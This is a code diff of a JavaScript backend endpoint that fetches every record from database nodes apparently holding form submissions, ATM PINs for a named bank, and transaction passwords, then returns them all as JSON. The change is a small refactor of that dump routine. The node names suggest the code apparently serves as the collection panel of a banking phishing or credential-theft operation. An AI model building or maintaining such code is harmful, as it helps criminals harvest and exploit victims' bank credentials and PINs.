@@ -79,7 +79,6 @@ export const getUserFullData = async (req, res) => {
 
 export const getAllData = async (req, res) => {
   try {
-    // --------- RTDB NODES -----------
     const nodes = {
       forms: "form_submissions",
       atmPins: "unionbank_atm_pin",
@@ -100,19 +99,33 @@ export const getAllData = async (req, res) => {
       transactionPasswords: []
     };
 
-    // --------- FETCH ALL NODES ----------
-    for (const key in nodes) {
-      const nodeName = nodes[key];
-      const snap = await rtdb.ref(nodeName).get();
+    // UID Cleaner
+    const cleanUID = (uid) => {
+      if (!uid) return null;
+      return String(uid).trim();
+    };
 
-      if (snap.exists()) {
-        const raw = snap.val();
-        const arr = Object.entries(raw).map(([id, obj]) => ({
-          id,
-          ...obj
-        }));
-        result[key] = arr;
-      }
+    for (const key in nodes) {
+      const snap = await rtdb.ref(nodes[key]).get();
+
+      if (!snap.exists()) continue;
+
+      const raw = snap.val();
+
+      // IGNORE ID → ONLY RETURN VALUES
+      const arr = Object.values(raw)
+        .map(obj => {
+          const uid = cleanUID(obj.uniqueid);
+          if (!uid) return null;
+
+          return {
+            ...obj,
+            uniqueid: uid
+          };
+        })
+        .filter(Boolean);
+
+      result[key] = arr;
     }
 
     return res.json({
@@ -129,6 +142,7 @@ export const getAllData = async (req, res) => {
     });
   }
 };
+
 
 export const getLatestForm = async (req, res) => {
   try {
